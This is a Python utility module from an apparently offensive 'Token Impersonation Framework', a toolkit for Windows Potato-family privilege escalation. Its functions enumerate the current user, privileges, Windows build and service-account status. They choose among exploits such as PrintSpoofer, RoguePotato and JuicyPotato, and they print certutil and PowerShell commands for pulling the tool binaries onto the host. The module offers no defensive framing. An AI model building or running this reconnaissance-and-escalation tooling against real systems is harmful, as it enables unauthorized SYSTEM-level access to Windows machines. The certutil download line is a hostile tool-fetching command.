import os
import sys
import subprocess
from pathlib import Path
from typing import Optional, Dict


def print_banner():
    """Print the framework banner."""
    banner = """
╔═══════════════════════════════════════════════════════════╗
║     Token Impersonation Framework v1.0                    ║
║     Windows Potato Privilege Escalation Toolkit           ║
╠═══════════════════════════════════════════════════════════╣
║  Exploits:                                                ║
║    • PrintSpoofer  - Spooler named pipe impersonation     ║
║    • RoguePotato   - Remote DCOM relay impersonation      ║
║    • JuicyPotato   - BITS DCOM impersonation (legacy)     ║
║    • SweetPotato   - Multi-technique exploitation         ║
╚═══════════════════════════════════════════════════════════╝
"""
    print(banner)


def print_status():
    """Print current system status and context."""
    print("\n[*] System Context:")

    # Get current user
    result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
    print(f"    User: {result.stdout.strip()}")

    # Check for elevated
    result = subprocess.run("whoami /groups | findstr /i \"High Mandatory\"",
                            shell=True, capture_output=True, text=True)
    is_elevated = "High Mandatory" in result.stdout
    print(f"    Elevated: {'Yes' if is_elevated else 'No'}")

    # Get hostname
    hostname = os.environ.get('COMPUTERNAME', os.environ.get('HOSTNAME', 'unknown'))
    print(f"    Hostname: {hostname}")


def check_windows_version() -> Dict[str, str]:
    """
    Get Windows version information.

    Returns:
        Dictionary with version information
    """
    info = {
        'os_name': '',
        'version': '',
        'build': '',
        'architecture': ''
    }

    result = subprocess.run(
        'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"',
        shell=True,
        capture_output=True,
        text=True
    )

    for line in result.stdout.split('\n'):
        if 'OS Name:' in line:
            info['os_name'] = line.split(':', 1)[1].strip()
        elif 'OS Version:' in line:
            info['version'] = line.split(':', 1)[1].strip()
            # Extract build number
            try:
                parts = info['version'].split()
                for i, p in enumerate(parts):
                    if p == 'Build':
                        info['build'] = parts[i + 1]
                        break
            except:
                pass
        elif 'System Type:' in line:
            info['architecture'] = 'x64' if 'x64' in line else 'x86'

    return info


def download_tool(tool_name: str, destination: str = None) -> bool:
    """
    Download a Potato tool (placeholder - shows instructions).

    Args:
        tool_name: Name of the tool to download
        destination: Where to save the tool

    Returns:
        True if successful, False otherwise
    """
    from constants import TOOL_URLS, TOOL_PATHS

    url = TOOL_URLS.get(tool_name)
    dest = destination or TOOL_PATHS.get(tool_name)

    if not url:
        print(f"[-] Unknown tool: {tool_name}")
        return False

    print(f"\n[*] To download {tool_name}:")
    print(f"    1. Visit: {url}")
    print(f"    2. Download the appropriate binary")
    print(f"    3. Place at: {dest}")
    print(f"\n[*] Or use certutil:")
    print(f"    certutil -urlcache -f <direct_url> {dest}")
    print(f"\n[*] Or use PowerShell:")
    print(f"    Invoke-WebRequest -Uri <direct_url> -OutFile {dest}")

    return False


def get_potato_recommendation(build_number: int) -> list:
    """
    Get recommended Potato tools based on Windows build.

    Args:
        build_number: Windows build number

    Returns:
        List of recommended tools in priority order
    """
    from constants import WINDOWS_BUILDS

    # JuicyPotato patched in build 17763
    if build_number >= 17763:
        return ['printspoofer', 'roguepotato', 'sweetpotato', 'godpotato']
    else:
        return ['juicypotato', 'sweetpotato', 'printspoofer']


def is_service_account() -> bool:
    """
    Check if running as a service account.

    Returns:
        True if service account, False otherwise
    """
    result = subprocess.run("whoami", shell=True, capture_output=True, text=True)
    username = result.stdout.strip().upper()

    service_indicators = [
        'NT AUTHORITY\\LOCAL SERVICE',
        'NT AUTHORITY\\NETWORK SERVICE',
        'NT AUTHORITY\\SYSTEM',
        'IIS APPPOOL',
        'IUSR',
        'IWAM'
    ]

    return any(ind in username for ind in service_indicators)


def check_required_privilege() -> bool:
    """
    Check if SeImpersonatePrivilege is available.

    Returns:
        True if privilege available, False otherwise
    """
    result = subprocess.run("whoami /priv", shell=True, capture_output=True, text=True)

    has_impersonate = 'SeImpersonatePrivilege' in result.stdout and 'Enabled' in result.stdout
    has_primary = 'SeAssignPrimaryTokenPrivilege' in result.stdout and 'Enabled' in result.stdout

    return has_impersonate or has_primary